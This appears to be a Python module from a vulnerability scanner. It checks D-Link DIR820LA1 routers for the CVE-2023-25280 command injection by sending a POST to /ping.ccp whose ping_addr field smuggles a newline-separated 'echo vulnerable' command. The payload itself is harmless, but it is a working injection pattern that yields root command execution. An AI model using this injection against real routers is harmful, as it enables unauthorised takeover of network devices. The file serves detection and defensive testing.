"""Agent Asteroid implementation for CVE-2023-25280"""

import logging
import re
from urllib import parse as urlparse

import requests

from agent import definitions
from agent import exploits_registry
from agent.exploits import webexploit

VULNERABILITY_TITLE = "Command Injection in D-Link DIR820LA1"
VULNERABILITY_REFERENCE = "CVE-2023-25280"
VULNERABILITY_DESCRIPTION = """A command injection vulnerability exists in pingV4Msg of component "/ping.ccp" of D-Link DIR820LA1_FW105B03, allowing an attacker to elevate privileges to root via a crafted payload."""
RISK_RATING = "CRITICAL"

MAX_REDIRECTS = 2
DEFAULT_TIMEOUT = 90


@exploits_registry.register
class DLinkDIR820LA1CommandInjectionExploit(webexploit.WebExploit):
    accept_request = definitions.Request(method="GET", path="/")
    check_request = definitions.Request(method="POST", path="/ping.ccp")
    accept_pattern = [re.compile(r"<a href=\"http://www.dlink.com/us/en/support\">")]
    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
    )

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        """Rule to detect the command injection vulnerability on a specific target.

        Args:
            target: Target to scan

        Returns:
            List of identified vulnerabilities.
        """
        session = requests.Session()
        session.max_redirects = MAX_REDIRECTS
        session.verify = False

        target_endpoint = urlparse.urljoin(target.origin, self.check_request.path)

        payload = {"ccp_act": "pingV4Msg", "ping_addr": "%0aecho vulnerable%0a"}

        try:
            resp = session.post(
                target_endpoint,
                data=payload,
                timeout=DEFAULT_TIMEOUT,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
            )
        except requests.RequestException as e:
            logging.error("HTTP Request failed: %s", e)
            return []

        if "vulnerable" in resp.text:
            vulnerability = self._create_vulnerability(target)
            return [vulnerability]
        else:
            return []
